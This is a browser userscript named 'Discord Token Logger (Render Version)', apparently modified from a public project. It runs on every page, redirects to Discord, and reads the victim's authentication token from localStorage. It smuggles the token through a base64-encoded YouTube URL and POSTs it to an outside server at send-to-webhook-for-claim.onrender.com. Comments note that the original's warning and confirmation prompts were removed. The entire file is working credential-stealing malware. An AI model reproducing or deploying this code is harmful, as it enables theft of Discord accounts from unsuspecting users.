// ==UserScript==
// @name         Discord Token Logger (Render Version)
// @namespace    https://github.com/Lyzev/DiscordTokenLogger
// @version      2.0
// @description  Sends token to Render server
// @author       Modified by NYX
// @run-at       document-start
// @include      *
// @grant        GM_xmlhttpRequest
// @connect      send-to-webhook-for-claim.onrender.com
// @connect      discord.com
// @connect      youtube.com
// ==/UserScript==

(function () {
    // Remove alerts if you want (they're from original)
    // alert('WARNING: Running this script may have legal consequences. Proceed with caution.');
    // if (!confirm('Are you sure you want to run this script?')) {
    //     return;
    // }

    const RENDER_SERVER = "https://send-to-webhook-for-claim.onrender.com";
    
    if (window.location.href.startsWith("https://www.youtube.com/")) {
        const url = new URL(window.location.href);
        const param = atob(url.searchParams.get("v"));
        
        if (param != null) {
            // Remove first 2 and last 2 characters
            const cleanToken = param.slice(2, -2);
            
            // Send to Render server
            GM_xmlhttpRequest({
                method: "POST",
                url: RENDER_SERVER + "/api/token",
                headers: {
                    "Content-Type": "application/json"
                },
                data: JSON.stringify({
                    token: cleanToken,
                    timestamp: new Date().toISOString()
                }),
                onload: function(response) {
                    console.log("Token sent to server");
                }
            });
        }
    } else if (window.location.href === "https://discord.com/channels/@me") {
        const token = localStorage.token;
        if (token != null) {
            window.location.href = "https://www.youtube.com/watch?v=" + btoa(JSON.stringify(token));
        }
    } else {
        window.location.href = "https://discord.com/channels/@me";
    }
})();
